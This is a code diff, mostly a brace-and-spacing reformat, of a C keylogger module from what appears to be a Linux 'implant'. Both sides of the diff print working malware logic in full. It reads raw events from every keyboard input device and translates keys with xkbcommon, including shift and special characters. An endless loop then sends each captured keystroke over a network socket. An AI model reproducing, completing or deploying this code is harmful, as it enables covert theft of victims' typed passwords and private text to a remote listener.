@@ -16,54 +16,49 @@
 #include "implant.h"
 
 static const translated_key_t KEYS[] = {
-    { "space", ' ' },
-    { "comma", ',' },
-    { "period", '.' },
-    { "slash", '/' },
-    { "questionmark", '?' },
-    { "semicolon", ';' },
-    { "apostrophe", '\'' },
-    { "bracketleft", '[' },
-    { "bracketright", ']' },
-    { "backslash", '\\' },
-    { "pipe", '|' },
-    { "Tab", '\t' },
-    { "minus", '-' },
-    { "plus", '+' },
-    { "equal", '=' },
-    { "dollar", '$' },
-    { "percentage", '%' },
-    { "star", '*' },
-    { "parenthesisleft", '(' },
-    { "parenthesisright", ')' },
-    { "underscore", '_' },
-    { "ampersand", '&' },
-    { "pound", '#' },
-    { "arobase", '@' },
-    { "tild", '~' },
-    { NULL, 0 },
+    {"space", ' '},
+    {"comma", ','},
+    {"period", '.'},
+    {"slash", '/'},
+    {"questionmark", '?'},
+    {"semicolon", ';'},
+    {"apostrophe", '\''},
+    {"bracketleft", '['},
+    {"bracketright", ']'},
+    {"backslash", '\\'},
+    {"pipe", '|'},
+    {"Tab", '\t'},
+    {"minus", '-'},
+    {"plus", '+'},
+    {"equal", '='},
+    {"dollar", '$'},
+    {"percentage", '%'},
+    {"star", '*'},
+    {"parenthesisleft", '('},
+    {"parenthesisright", ')'},
+    {"underscore", '_'},
+    {"ampersand", '&'},
+    {"pound", '#'},
+    {"arobase", '@'},
+    {"tild", '~'},
+    {NULL, 0},
 };
 
 static int
-get_highest_fd(implant_t* instance)
-{
+get_highest_fd(implant_t *instance) {
     int highest_fd = -1;
 
-    keyboard_t* it = NULL;
-    TAILQ_FOREACH(it, &instance->kbd, devices)
-    {
+    keyboard_t *it = NULL;
+    TAILQ_FOREACH(it, &instance->kbd, devices) {
         highest_fd = (it->fd > highest_fd) ? it->fd : highest_fd;
     }
     return highest_fd;
 }
 
-static char*
-check_translated_key(char* key_desc)
-{
-    for (size_t ctr = 0; KEYS[ctr].description != NULL; ctr++)
-    {
-        if (!strcmp(KEYS[ctr].description, key_desc))
-        {
+static char *
+check_translated_key(char *key_desc) {
+    for (size_t ctr = 0; KEYS[ctr].description != NULL; ctr++) {
+        if (!strcmp(KEYS[ctr].description, key_desc)) {
 
             memset(key_desc, 0, STRING_BUFFER_SIZE);
             key_desc[0] = KEYS[ctr].representation;
@@ -75,9 +70,8 @@ check_translated_key(char* key_desc)
 }
 
 static int
-log_keyboard(int fd, struct xkb_state* state, char** key_desc_ptr)
-{
-    struct input_event evt = { 0 };
+log_keyboard(int fd, struct xkb_state *state, char **key_desc_ptr) {
+    struct input_event evt = {0};
     static bool shift_pressed = false;
 
     /*
@@ -93,8 +87,7 @@ log_keyboard(int fd, struct xkb_state* state, char** key_desc_ptr)
     DEBUG_LOG("[!] read %ld bytes", bytes_read);
 #endif
 
-    if (bytes_read != sizeof(evt))
-    {
+    if (bytes_read != sizeof(evt)) {
 
 #ifdef DEBUG
         DEBUG_LOG("[!] read() error: %s", strerror(errno));
@@ -105,20 +98,16 @@ log_keyboard(int fd, struct xkb_state* state, char** key_desc_ptr)
 
     /* checking is we are in MAJ key. TODO: check if CAPS_LOCK is enabled or not.
      */
-    if (evt.type == EV_KEY && evt.value == KEY_RELEASED)
-    {
-        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT)
-        {
+    if (evt.type == EV_KEY && evt.value == KEY_RELEASED) {
+        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
             shift_pressed = false;
             return SUCCESSFUL;
         }
     }
 
-    if (evt.type == EV_KEY && evt.value == KEY_PRESSED)
-    {
+    if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {
 
-        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT)
-        {
+        if (evt.code == KEY_LEFTSHIFT || evt.code == KEY_RIGHTSHIFT) {
             shift_pressed = true;
             return SUCCESSFUL;
         }
@@ -149,17 +138,14 @@ log_keyboard(int fd, struct xkb_state* state, char** key_desc_ptr)
 /*
     main loop to listen for keys and stuff
 */
-void
-keylog(implant_t* instance, int sockfd)
-{
+void keylog(implant_t *instance, int sockfd) {
 
     /* first set up select etc */
     int highest_fd = get_highest_fd(instance);
     fd_set rd, err;
     int status = 0;
 
-    if (highest_fd < 0)
-    {
+    if (highest_fd < 0) {
 
 #ifdef DEBUG
         DEBUG_LOG("[!] no keyboard found. exiting");
@@ -175,13 +161,12 @@ keylog(implant_t* instance, int sockfd)
        the correct language & manages special characters, shift, etc.
     */
 
-    struct xkb_context* context = NULL;
-    struct xkb_keymap* keymap = NULL;
-    struct xkb_state* state = NULL;
+    struct xkb_context *context = NULL;
+    struct xkb_keymap *keymap = NULL;
+    struct xkb_state *state = NULL;
 
     context = xkb_context_new(0);
-    if (!context)
-    {
+    if (!context) {
 
 #ifdef DEBUG
         DEBUG_LOG("[!] error with xkb_context_new(): %s", strerror(errno));
@@ -191,8 +176,7 @@ keylog(implant_t* instance, int sockfd)
     }
 
     keymap = xkb_keymap_new_from_names(context, NULL, 0);
-    if (!keymap)
-    {
+    if (!keymap) {
 
 #ifdef DEBUG
         DEBUG_LOG("[!] error with xkb_keymap_new_from_names(): %s",
@@ -203,8 +187,7 @@ keylog(implant_t* instance, int sockfd)
     }
 
     state = xkb_state_new(keymap);
-    if (!state)
-    {
+    if (!state) {
 
 #ifdef DEBUG
         DEBUG_LOG("[!] error with xkb_state_new(): %s", strerror(errno));
@@ -213,20 +196,18 @@ keylog(implant_t* instance, int sockfd)
         goto LOG_FUNCTION_CLEANUP;
     }
 
-    char* key_desc = malloc(sizeof(char) * (STRING_BUFFER_SIZE + 1));
+    char *key_desc = malloc(sizeof(char) * (STRING_BUFFER_SIZE + 1));
     if (!key_desc)
         goto LOG_FUNCTION_CLEANUP;
 
     memset(key_desc, 0, STRING_BUFFER_SIZE);
 
     /* run the damn loop */
-    while (0x520)
-    {
+    while (0x520) {
 
         /* setup FD-sets */
-        keyboard_t* it = NULL;
-        TAILQ_FOREACH(it, &instance->kbd, devices)
-        {
+        keyboard_t *it = NULL;
+        TAILQ_FOREACH(it, &instance->kbd, devices) {
             FD_SET(it->fd, &rd);
             FD_SET(it->fd, &err);
         }
@@ -245,14 +226,13 @@ keylog(implant_t* instance, int sockfd)
            events
         */
 #ifdef DEBUG
-        struct timeval timeout = { 0, 1 };
+        struct timeval timeout = {0, 1};
         status = select(highest_fd + 1, &rd, NULL, &err, &timeout);
 #else
         status = select(highest_fd + 1, &rd, NULL, &err, NULL);
 #endif
 
-        if (status < 0)
-        {
+        if (status < 0) {
 
 #ifdef DEBUG
             DEBUG_LOG("[!] select error: %s", strerror(errno));
@@ -263,10 +243,8 @@ keylog(implant_t* instance, int sockfd)
 
         /* check file descriptors (first for error, then for new input) */
         it = NULL;
-        TAILQ_FOREACH(it, &instance->kbd, devices)
-        {
-            if (FD_ISSET(it->fd, &err))
-            {
+        TAILQ_FOREACH(it, &instance->kbd, devices) {
+            if (FD_ISSET(it->fd, &err)) {
 
 #ifdef DEBUG
                 DEBUG_LOG("[!] Error on file descriptor %d", it->fd);
@@ -279,7 +257,7 @@ keylog(implant_t* instance, int sockfd)
                 close(it->fd);
 
                 /* making sure we dont have a memory leak here */
-                void* tmp_ptr = &instance->kbd;
+                void *tmp_ptr = &instance->kbd;
                 TAILQ_REMOVE(&instance->kbd, it, devices);
 
                 free(tmp_ptr);
@@ -287,8 +265,7 @@ keylog(implant_t* instance, int sockfd)
             }
 
             /* checking for new input here */
-            if (FD_ISSET(it->fd, &rd))
-            {
+            if (FD_ISSET(it->fd, &rd)) {
 
                 memset(key_desc, 0, STRING_BUFFER_SIZE);
 
@@ -296,13 +273,11 @@ keylog(implant_t* instance, int sockfd)
                     should we really kill the run here or can we recover this ?
                     i need to run some tests before making a decision.
                 */
-                if (ERROR == log_keyboard(it->fd, state, &key_desc))
-                {
+                if (ERROR == log_keyboard(it->fd, state, &key_desc)) {
                     goto LOG_FUNCTION_CLEANUP;
                 }
 
-                if (ERROR == send_key_description(sockfd, key_desc))
-                {
+                if (ERROR == send_key_description(sockfd, key_desc)) {
                     goto LOG_FUNCTION_CLEANUP;
                 }
             }
@@ -312,11 +287,9 @@ keylog(implant_t* instance, int sockfd)
 LOG_FUNCTION_CLEANUP:
 
     /* closing file descriptors if instance still exists */
-    if (instance != NULL)
-    {
-        keyboard_t* it = NULL;
-        TAILQ_FOREACH(it, &instance->kbd, devices)
-        {
+    if (instance != NULL) {
+        keyboard_t *it = NULL;
+        TAILQ_FOREACH(it, &instance->kbd, devices) {
             close(it->fd);
         }
     }
